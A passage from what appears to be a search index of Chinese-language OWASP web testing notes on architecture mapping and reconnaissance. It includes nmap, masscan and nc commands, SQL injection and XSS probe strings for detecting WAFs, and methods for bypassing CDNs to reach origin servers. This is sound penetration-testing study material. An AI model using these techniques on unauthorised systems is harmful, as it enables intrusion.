<p>\u8fd9\u4e9b\u8d44\u6e90\u76f4\u63a5\u7531\u7528\u6237\u7684\u6d4f\u89c8\u5668\u8bf7\u6c42\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u6216\u62e6\u622a\u4ee3\u7406\u8f7b\u677e\u8bc6\u522b\u3002\u867d\u7136\u8bc6\u522b\u5b83\u4eec\u5f88\u91cd\u8981\uff08\u56e0\u4e3a\u5b83\u4eec\u4f1a\u5f71\u54cd\u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u5168\u6027\uff09\uff0c\u4f46\u8bf7\u8bb0\u4f4f_\u5b83\u4eec\u901a\u5e38\u4e0d\u5728\u6d4b\u8bd5\u8303\u56f4\u5185_\uff0c\u56e0\u4e3a\u5b83\u4eec\u5c5e\u4e8e\u7b2c\u4e09\u65b9\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_11","title":"\u7f51\u7edc\u7ec4\u4ef6","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_12","title":"\u53cd\u5411\u4ee3\u7406","text":"<p>\u53cd\u5411\u4ee3\u7406\u4f4d\u4e8e\u4e00\u4e2a\u6216\u591a\u4e2a\u540e\u7aef\u670d\u52a1\u5668\u4e4b\u524d\uff0c\u5e76\u5c06\u8bf7\u6c42\u91cd\u5b9a\u5411\u5230\u9002\u5f53\u7684\u76ee\u7684\u5730\u3002\u5b83\u4eec\u53ef\u4ee5\u5b9e\u73b0\u5404\u79cd\u529f\u80fd\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>\u5145\u5f53\u8d1f\u8f7d\u5e73\u8861\u5668\u6216Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\u3002</li> <li>\u5141\u8bb8\u591a\u4e2a\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u5355\u4e2a IP \u5730\u5740\u6216\u57df\uff08\u5728\u5b50\u6587\u4ef6\u5939\u4e2d\uff09\u3002</li> <li>\u5b9e\u65bd IP \u8fc7\u6ee4\u6216\u5176\u4ed6\u9650\u5236\u3002</li> <li>\u4ece\u540e\u7aef\u7f13\u5b58\u5185\u5bb9\u4ee5\u63d0\u9ad8\u6027\u80fd\u3002</li> </ul> <p>\u5e76\u975e\u603b\u80fd\u68c0\u6d4b\u5230\u53cd\u5411\u4ee3\u7406\uff08\u7279\u522b\u662f\u5982\u679c\u5b83\u540e\u9762\u53ea\u6709\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff09\uff0c\u4f46\u6709\u65f6\u60a8\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u8bc6\u522b\u5b83\uff1a</p> <ul> <li>\u524d\u7aef\u670d\u52a1\u5668\u548c\u540e\u7aef\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u4e0d\u5339\u914d\uff08\u4f8b\u5982<code>Server: nginx</code>\u5e26\u6709 ASP.NET \u5e94\u7528\u7a0b\u5e8f\u7684\u6807\u5934\uff09\u3002<ul> <li>\u8fd9\u6709\u65f6\u4f1a\u5bfc\u81f4\u8bf7\u6c42\u8d70\u79c1\u6f0f\u6d1e\u3002</li> </ul> </li> <li>\u91cd\u590d\u7684\u6807\u5934\uff08\u5c24\u5176\u662f<code>Server</code>\u6807\u5934\uff09\u3002</li> <li>\u5728\u540c\u4e00 IP \u5730\u5740\u6216\u57df\u4e0a\u6258\u7ba1\u591a\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff08\u5c24\u5176\u662f\u5f53\u5b83\u4eec\u4f7f\u7528\u4e0d\u540c\u8bed\u8a00\u65f6\uff09\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_13","title":"\u8d1f\u8f7d\u5747\u8861\u5668","text":"<p>\u8d1f\u8f7d\u5747\u8861\u5668\u4f4d\u4e8e\u591a\u4e2a\u540e\u7aef\u670d\u52a1\u5668\u4e4b\u524d\uff0c\u5e76\u5728\u5b83\u4eec\u4e4b\u95f4\u5206\u914d\u8bf7\u6c42\uff0c\u4ee5\u4fbf\u4e3a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u66f4\u5927\u7684\u5197\u4f59\u548c\u5904\u7406\u80fd\u529b\u3002</p> <p>\u8d1f\u8f7d\u5747\u8861\u5668\u53ef\u80fd\u96be\u4ee5\u68c0\u6d4b\uff0c\u4f46\u6709\u65f6\u53ef\u4ee5\u901a\u8fc7\u53d1\u51fa\u591a\u4e2a\u8bf7\u6c42\u5e76\u68c0\u67e5\u54cd\u5e94\u7684\u5dee\u5f02\u6765\u8bc6\u522b\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>\u7cfb\u7edf\u65f6\u95f4\u4e0d\u4e00\u81f4\u3002</li> <li>\u8be6\u7ec6\u9519\u8bef\u6d88\u606f\u4e2d\u7684\u4e0d\u540c\u5185\u90e8 IP \u5730\u5740\u6216\u4e3b\u673a\u540d\u3002</li> <li>\u4ece\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020 (SSRF)\u8fd4\u56de\u7684\u4e0d\u540c\u5730\u5740\u3002</li> </ul> <p>\u5b83\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7279\u5b9a cookie \u7684\u5b58\u5728\u6765\u6307\u793a\uff08\u4f8b\u5982\uff0cF5 BIG-IP \u8d1f\u8f7d\u5e73\u8861\u5668\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a<code>BIGipServer</code>.</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#cdn","title":"\u5185\u5bb9\u5206\u53d1\u7f51\u7edc (CDN)","text":"<p>\u5185\u5bb9\u5206\u53d1\u7f51\u7edc (CDN) \u662f\u4e00\u7ec4\u5730\u7406\u5206\u5e03\u7684\u7f13\u5b58\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u65e8\u5728\u63d0\u9ad8\u7f51\u7ad9\u6027\u80fd\uff0c\u4e3a\u7f51\u7ad9\u63d0\u4f9b\u989d\u5916\u7684\u5f39\u6027\u3002</p> <p>\u5b83\u901a\u5e38\u901a\u8fc7\u5c06\u9762\u5411\u516c\u4f17\u7684\u57df\u6307\u5411 CDN \u7684\u670d\u52a1\u5668\uff0c\u7136\u540e\u914d\u7f6e CDN \u4ee5\u8fde\u63a5\u5230\u6b63\u786e\u7684\u540e\u7aef\u670d\u52a1\u5668\uff08\u6709\u65f6\u79f0\u4e3a\u201c\u6e90\u201d\uff09\u6765\u914d\u7f6e\u3002</p> <p>\u68c0\u6d4b CDN \u7684\u6700\u7b80\u5355\u65b9\u6cd5\u662f\u5bf9\u57df\u89e3\u6790\u5230\u7684 IP \u5730\u5740\u6267\u884c WHOIS \u67e5\u8be2\u3002\u5982\u679c\u4ed6\u4eec\u5c5e\u4e8e CDN \u516c\u53f8\uff08\u4f8b\u5982 Akamai\u3001Cloudflare \u6216 Fastly - \u8bf7\u53c2\u9605\u7ef4\u57fa\u767e\u79d1\u4ee5\u83b7\u53d6\u66f4\u5b8c\u6574\u7684\u5217\u8868\uff09\uff0c\u90a3\u4e48\u5c31\u597d\u50cf\u6b63\u5728\u4f7f\u7528 CDN\u3002</p> <p>\u5728 CDN \u540e\u9762\u6d4b\u8bd5\u7ad9\u70b9\u65f6\uff0c\u60a8\u5e94\u8be5\u7262\u8bb0\u4ee5\u4e0b\u51e0\u70b9\uff1a</p> <ul> <li>IP \u548c\u670d\u52a1\u5668\u5c5e\u4e8e CDN \u63d0\u4f9b\u5546\uff0c\u5f88\u53ef\u80fd\u4e0d\u5728\u57fa\u7840\u8bbe\u65bd\u6d4b\u8bd5\u8303\u56f4\u5185\u3002</li> <li>\u8bb8\u591a CDN \u8fd8\u5305\u62ec\u673a\u5668\u4eba\u68c0\u6d4b\u3001\u901f\u7387\u9650\u5236\u548c Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\u7b49\u529f\u80fd\u3002</li> <li>CDN \u901a\u5e38\u7f13\u5b58\u5185\u5bb9\uff0c\u56e0\u6b64\u5bf9\u540e\u7aef\u7f51\u7ad9\u6240\u505a\u7684\u4efb\u4f55\u66f4\u6539\u53ef\u80fd\u4e0d\u4f1a\u7acb\u5373\u663e\u793a\u3002</li> </ul> <p>\u5982\u679c\u8be5\u7ad9\u70b9\u4f4d\u4e8e CDN \u540e\u9762\uff0c\u5219\u8bc6\u522b\u540e\u7aef\u670d\u52a1\u5668\u4f1a\u5f88\u6709\u7528\u3002\u5982\u679c\u4ed6\u4eec\u6ca1\u6709\u5b9e\u65bd\u9002\u5f53\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u90a3\u4e48\u60a8\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u8bbf\u95ee\u540e\u7aef\u670d\u52a1\u5668\u6765\u7ed5\u8fc7 CDN\uff08\u53ca\u5176\u63d0\u4f9b\u7684\u4efb\u4f55\u4fdd\u62a4\uff09\u3002\u6709\u591a\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u53ef\u4ee5\u8ba9\u60a8\u8bc6\u522b\u540e\u7aef\u7cfb\u7edf\uff1a</p> <ul> <li>\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u7684\u7535\u5b50\u90ae\u4ef6\u53ef\u80fd\u76f4\u63a5\u6765\u81ea\u540e\u7aef\u670d\u52a1\u5668\uff0c\u8fd9\u53ef\u80fd\u4f1a\u6cc4\u9732\u5176 IP \u5730\u5740\u3002</li> <li>\u57df\u7684 DNS \u7814\u78e8\u3001\u533a\u57df\u4f20\u8f93\u6216\u8bc1\u4e66\u900f\u660e\u5217\u8868\u53ef\u80fd\u4f1a\u5728\u5b50\u57df\u4e0a\u663e\u793a\u5b83\u3002</li> <li>\u626b\u63cf\u516c\u53f8\u5df2\u77e5\u4f7f\u7528\u7684 IP \u8303\u56f4\u53ef\u80fd\u4f1a\u627e\u5230\u540e\u7aef\u670d\u52a1\u5668\u3002</li> <li>\u5229\u7528\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020 (SSRF)\u53ef\u80fd\u4f1a\u6cc4\u9732 IP \u5730\u5740\u3002</li> <li>\u6765\u81ea\u5e94\u7528\u7a0b\u5e8f\u7684\u8be6\u7ec6\u9519\u8bef\u6d88\u606f\u53ef\u80fd\u4f1a\u66b4\u9732 IP \u5730\u5740\u6216\u4e3b\u673a\u540d\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_14","title":"\u5b89\u5168\u7ec4\u4ef6","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_15","title":"\u7f51\u7edc\u9632\u706b\u5899","text":"<p>\u5927\u591a\u6570 Web \u670d\u52a1\u5668\u5c06\u53d7\u5230\u6570\u636e\u5305\u8fc7\u6ee4\u6216\u72b6\u6001\u68c0\u6d4b\u9632\u706b\u5899\u7684\u4fdd\u62a4\uff0c\u8fd9\u4e9b\u9632\u706b\u5899\u4f1a\u963b\u6b62\u4efb\u4f55\u4e0d\u9700\u8981\u7684\u7f51\u7edc\u6d41\u91cf\u3002\u8981\u68c0\u6d4b\u5230\u8fd9\u4e00\u70b9\uff0c\u8bf7\u5bf9\u670d\u52a1\u5668\u6267\u884c\u7aef\u53e3\u626b\u63cf\u5e76\u68c0\u67e5\u7ed3\u679c\u3002</p> <p>\u5982\u679c\u5927\u591a\u6570\u7aef\u53e3\u663e\u793a\u4e3a\u201c\u5173\u95ed\u201d\uff08\u5373\uff0c\u5b83\u4eec\u8fd4\u56de\u4e00\u4e2a<code>RST</code>\u6570\u636e\u5305\u4ee5\u54cd\u5e94\u521d\u59cb<code>SYN</code>\u6570\u636e\u5305\uff09\uff0c\u5219\u8fd9\u8868\u660e\u670d\u52a1\u5668\u53ef\u80fd\u4e0d\u53d7\u9632\u706b\u5899\u4fdd\u62a4\u3002\u5982\u679c\u7aef\u53e3\u663e\u793a\u4e3a\u201c\u5df2\u8fc7\u6ee4\u201d\uff08\u5373\uff0c\u5c06\u6570\u636e\u5305\u53d1\u9001\u5230\u672a\u4f7f\u7528\u7684\u7aef\u53e3\u65f6\u672a\u6536\u5230\u54cd\u5e94<code>SYN</code>\uff09\uff0c\u5219\u5f88\u53ef\u80fd\u5b58\u5728\u9632\u706b\u5899\u3002</p> <p>\u6b64\u5916\uff0c\u5982\u679c\u5411\u4e16\u754c\u516c\u5f00\u4e86\u4e0d\u9002\u5f53\u7684\u670d\u52a1\uff08\u4f8b\u5982 SMTP\u3001IMAP\u3001MySQL \u7b49\uff09\uff0c\u8fd9\u8868\u660e\u8981\u4e48\u6ca1\u6709\u9002\u5f53\u7684\u9632\u706b\u5899\uff0c\u8981\u4e48\u9632\u706b\u5899\u914d\u7f6e\u4e0d\u5f53\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_16","title":"\u7f51\u7edc\u5165\u4fb5\u68c0\u6d4b\u4e0e\u9632\u5fa1\u7cfb\u7edf","text":"<p>\u7f51\u7edc\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf (IDS) \u68c0\u6d4b\u53ef\u7591\u6216\u6076\u610f\u7684\u7f51\u7edc\u7ea7\u6d3b\u52a8\uff08\u4f8b\u5982\u7aef\u53e3\u6216\u6f0f\u6d1e\u626b\u63cf\uff09\u5e76\u53d1\u51fa\u8b66\u62a5\u3002\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf (IPS) \u4e0e\u6b64\u7c7b\u4f3c\uff0c\u4f46\u4e5f\u4f1a\u91c7\u53d6\u63aa\u65bd\u963b\u6b62\u6d3b\u52a8 - \u901a\u5e38\u662f\u901a\u8fc7\u963b\u6b62\u6e90 IP \u5730\u5740\u3002</p> <p>\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u9488\u5bf9\u76ee\u6807\u8fd0\u884c\u81ea\u52a8\u626b\u63cf\u5de5\u5177\uff08\u4f8b\u5982\u7aef\u53e3\u626b\u63cf\u5668\uff09\u5e76\u67e5\u770b\u6e90 IP \u662f\u5426\u88ab\u963b\u6b62\u6765\u68c0\u6d4b IPS\u3002\u7136\u800c\uff0c\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u7ea7\u5de5\u5177\u53ef\u80fd\u65e0\u6cd5\u88ab IPS \u68c0\u6d4b\u5230\uff08\u7279\u522b\u662f\u5982\u679c\u5b83\u4e0d\u89e3\u5bc6 TLS\uff09\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#web-waf","title":"Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899 (WAF)","text":"<p>Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899 (WAF) \u68c0\u67e5 HTTP \u8bf7\u6c42\u7684\u5185\u5bb9\u5e76\u963b\u6b62\u90a3\u4e9b\u770b\u4f3c\u53ef\u7591\u6216\u6076\u610f\u7684\u8bf7\u6c42\uff0c\u6216\u52a8\u6001\u5e94\u7528\u5176\u4ed6\u63a7\u5236\uff0c\u4f8b\u5982 CAPTCHA \u6216\u901f\u7387\u9650\u5236\u3002\u5b83\u4eec\u901a\u5e38\u57fa\u4e8e\u4e00\u7ec4\u5df2\u77e5\u7684\u9519\u8bef\u7b7e\u540d\u548c\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u4f8b\u5982OWASP \u6838\u5fc3\u89c4\u5219\u96c6\u3002WAF \u53ef\u4ee5\u6709\u6548\u5730\u9632\u8303\u67d0\u4e9b\u7c7b\u578b\u7684\u653b\u51fb\uff08\u4f8b\u5982 SQL \u6ce8\u5165\u6216\u8de8\u7ad9\u70b9\u811a\u672c\uff09\uff0c\u4f46\u5bf9\u5176\u4ed6\u7c7b\u578b\u7684\u653b\u51fb\uff08\u4f8b\u5982\u8bbf\u95ee\u63a7\u5236\u6216\u4e1a\u52a1\u903b\u8f91\u76f8\u5173\u95ee\u9898\uff09\u5219\u6548\u679c\u8f83\u5dee\u3002</p> <p>WAF \u53ef\u4ee5\u90e8\u7f72\u5728\u591a\u4e2a\u4f4d\u7f6e\uff0c\u5305\u62ec\uff1a</p> <ul> <li>\u5728 Web \u670d\u52a1\u5668\u672c\u8eab\u4e0a\u3002</li> <li>\u5728\u5355\u72ec\u7684\u865a\u62df\u673a\u6216\u786c\u4ef6\u8bbe\u5907\u4e0a\u3002</li> <li>\u5728\u540e\u7aef\u670d\u52a1\u5668\u524d\u9762\u7684\u4e91\u7aef\u3002</li> </ul> <p>\u56e0\u4e3aWAF\u62e6\u622a\u4e86\u6076\u610f\u8bf7\u6c42\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u5728\u53c2\u6570\u4e2d\u52a0\u5165\u5e38\u89c1\u7684\u653b\u51fb\u5b57\u7b26\u4e32\uff0c\u89c2\u5bdf\u662f\u5426\u88ab\u62e6\u622a\u6765\u68c0\u6d4b\u3002\u4f8b\u5982\uff0c\u5c1d\u8bd5\u6dfb\u52a0\u4e00\u4e2a\u540d\u4e3a\u6216<code>foo</code>\u4e4b\u7c7b\u7684\u53c2\u6570\u3002\u5982\u679c\u8fd9\u4e9b\u8bf7\u6c42\u88ab\u963b\u6b62\uff0c\u5219\u8868\u660e\u53ef\u80fd\u5b58\u5728 WAF\u3002\u6b64\u5916\uff0c\u5757\u9875\u9762\u7684\u5185\u5bb9\u53ef\u4ee5\u63d0\u4f9b\u6709\u5173\u6b63\u5728\u4f7f\u7528\u7684\u7279\u5b9a\u6280\u672f\u7684\u4fe1\u606f\u3002\u6700\u540e\uff0c\u67d0\u4e9b WAF \u53ef\u80fd\u4f1a\u5c06 cookie \u6216 HTTP \u6807\u5934\u6dfb\u52a0\u5230\u53ef\u4ee5\u663e\u793a\u5176\u5b58\u5728\u7684\u54cd\u5e94\u4e2d\u3002<code>' UNION SELECT 1``&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p> <p>\u5982\u679c\u6b63\u5728\u4f7f\u7528\u57fa\u4e8e\u4e91\u7684 WAF\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u8bbf\u95ee\u540e\u7aef\u670d\u52a1\u5668\u6765\u7ed5\u8fc7\u5b83\uff0c\u4f7f\u7528\u5185\u5bb9\u4ea4\u4ed8\u7f51\u7edc\u90e8\u5206\u4e2d\u8ba8\u8bba\u7684\u76f8\u540c\u65b9\u6cd5\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"1.1\u4fe1\u606f\u6536\u96c6","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_1","title":"\u5229\u7528\u641c\u7d22\u5f15\u64ce\u53d1\u73b0\u4fe1\u606f\u6cc4\u9732","text":"<p>[[\u5bf9\u4fe1\u606f\u6cc4\u9732\u8fdb\u884c\u641c\u7d22\u5f15\u64ce\u53d1\u73b0\u4fa6\u5bdf|\u5168\u6587]]</p> <p>\u6d4b\u8bd5\u76ee\u6807\uff1a\u627e\u51fa\u5e94\u7528\u7a0b\u5e8f\u3001\u7cfb\u7edf\u6216\u7ec4\u7ec7\u516c\u5f00\u5728\u4e92\u8054\u7f51\u7684\u654f\u611f\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u3002</p> <pre><code>\u4f7f\u7528\u591a\u4e2a\u641c\u7d22\u5f15\u64ce\uff0c\u53ef\u5e26\u6765\u4e0d\u540c\u7684\u7ed3\u679c\uff0c\u66f4\u52a0\u5168\u9762\u3002\n</code></pre> <p>\u767e\u5ea6 | Bing | Binsearch.info | Comman Crawl | DuckDuckGo | Google | Internet Archive Wayback Machine |  Shodan | Fofa</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_2","title":"\u5e38\u89c1\u641c\u7d22\u8fd0\u7b97\u7b26","text":"<p><code>site</code> <code>inurl</code> <code>intitle</code> <code>intext</code> <code>filetype</code></p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#dorking","title":"Dorking","text":"<p>Google Hacking Database</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_3","title":"\u6307\u7eb9\u8bc6\u522b","text":"<p>[[\u6307\u7eb9 Web \u670d\u52a1\u5668|\u5168\u6587]]</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_4","title":"\u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b","text":"<p>\u6d4b\u8bd5\u76ee\u6807\uff1a\u786e\u5b9a\u6b63\u5728\u8fd0\u884c\u7684Web\u670d\u52a1\u5668\u7684\u7248\u672c\u548c\u7c7b\u578b\uff0c\u4ee5\u4fbf\u8fdb\u4e00\u6b65\u53d1\u73b0\u4efb\u4f55\u5df2\u77e5\u6f0f\u6d1e\u3002</p> <pre><code>\u4ece Web \u670d\u52a1\u5668\u4e2d\u5f15\u51fa\u4e00\u4e9b\u54cd\u5e94\uff0c\u7136\u540e\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u54cd\u5e94\u4e0e\u5df2\u77e5\u54cd\u5e94\u548c\u884c\u4e3a\u7684\u6570\u636e\u5e93\u8fdb\u884c\u6bd4\u8f83\u5339\u914d\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#banner-grabbing","title":"Banner Grabbing","text":"<p>\u54cd\u5e94\u5934 html\u6e90\u7801\u83b7\u53d6\u4fe1\u606f</p> <pre><code>nc -v target port\ntelnet target port\nopenssl\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_5","title":"\u53d1\u9001\u683c\u5f0f\u9519\u8bef\u7684\u8bf7\u6c42","text":"<p>\u9ed8\u8ba4\u9519\u8bef\u9875\u9762</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_6","title":"\u81ea\u52a8\u626b\u63cf\u5de5\u5177","text":"<p>Netcraft | Nikto |Nmap</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_7","title":"\u7ec4\u4ef6\u6307\u7eb9\u8bc6\u522b","text":"<p>[[\u6307\u7eb9 Web \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6|\u5168\u6587]]</p> <pre><code>\u5bf9 Web \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u7ec4\u4ef6\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\n</code></pre> <p>HTTP \u6807\u5934 cookie \u7f51\u9875\u6e90\u7801 \u7279\u5b9a\u6587\u4ef6\u548c\u6587\u4ef6\u5939 \u6587\u4ef6\u6269\u5c55\u540d \u9519\u8bef\u4fe1\u606f</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#html","title":"HTML\u6e90\u7801\u4e2d\u7684\u7ebf\u7d22","text":"<p>[[\u68c0\u67e5\u7f51\u7edc\u670d\u52a1\u5668\u56fe\u5143\u6587\u4ef6\u662f\u5426\u6709\u4fe1\u606f\u6cc4\u9732|\u5168\u6587]]</p> <pre><code>\u5206\u6790\u6e90\u7801\u8bc6\u522b\u9690\u85cf\u6216\u6df7\u6dc6\u7684\u8def\u5f84\u548c\u529f\u80fd\n\u63d0\u53d6\u5e76\u6620\u5c04\u53ef\u80fd\u5bfc\u81f4\u66f4\u597d\u7684\u4e86\u89e3\u624b\u5934\u7cfb\u7edf\u7684\u5176\u4ed6\u4fe1\u606f\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#meta-file","title":"Meta FIle","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#robots","title":"Robots","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#meta-tags","title":"META Tags","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#sitemap","title":"SiteMap","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#securitytxt","title":"security.txt","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#humanstxt","title":"humans.txt","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#other","title":"Other","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_8","title":"\u7f51\u9875\u5185\u5bb9","text":"<p>[[\u5ba1\u67e5\u7f51\u9875\u5185\u5bb9\u662f\u5426\u5b58\u5728\u4fe1\u606f\u6cc4\u9732|\u5168\u6587]]</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_9","title":"\u679a\u4e3e\u670d\u52a1\u5668\u4e0a\u7684\u6240\u6709\u7f51\u7ad9","text":"<p>[[\u679a\u4e3e Web \u670d\u52a1\u5668\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f|\u5168\u6587]]</p> <pre><code>\u6d4b\u8bd5 Web \u5e94\u7528\u7a0b\u5e8f\u6f0f\u6d1e\u7684\u6700\u91cd\u8981\u6b65\u9aa4\u662f\u627e\u51fa Web \u670d\u52a1\u5668\u4e0a\u6258\u7ba1\u4e86\u54ea\u4e9b\u7279\u5b9a Web \u5e94\u7528\u7a0b\u5e8f\u3002\u8bb8\u591a Web \u5e94\u7528\u7a0b\u5e8f\u90fd\u6709\u5df2\u77e5\u7684\u6f0f\u6d1e\u548c\u5df2\u77e5\u7684\u653b\u51fb\u7b56\u7565\uff0c\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\u548c\u653b\u51fb\u7b56\u7565\u6765\u83b7\u5f97\u8fdc\u7a0b\u63a7\u5236\u6216\u5229\u7528\u6570\u636e\u3002\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#url","title":"\u975e\u6807\u51c6URL","text":"<p>\u4e0d\u540c\u7f51\u7ad9\u5173\u8054\u5230\u4e0d\u540c\u8def\u5f84</p> <p><code>www.example.com/site1</code></p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#enumeration","title":"enumeration","text":"<p>\u6f0f\u6d1e\u626b\u63cf\u5668 Web \u670d\u52a1\u5668\u914d\u7f6e\u9519\u8bef \u5e76\u5141\u8bb8\u76ee\u5f55\u904d\u5386 \u7f51\u9875\u5f15\u7528 \u641c\u7d22\u5f15\u64ce\u6293\u53d6\u548c\u7d22\u5f15 <code>site:www.example.com</code> Fuzzing</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_10","title":"\u975e\u6807\u51c6\u7aef\u53e3","text":"<p><code>www.example.com:port1</code></p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_11","title":"\u7aef\u53e3\u626b\u63cf","text":"<pre><code>nmap -Pn -sT -sV -p- target\nmasscan -p1-65535 --rate=1000 -e tun0 target\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_12","title":"\u865a\u62df\u4e3b\u673a","text":"<p>\u5355\u4e2a IP \u5730\u5740\u53ef\u4e0e\u591a\u4e2a\u57df\u540d\u5173\u8054</p> 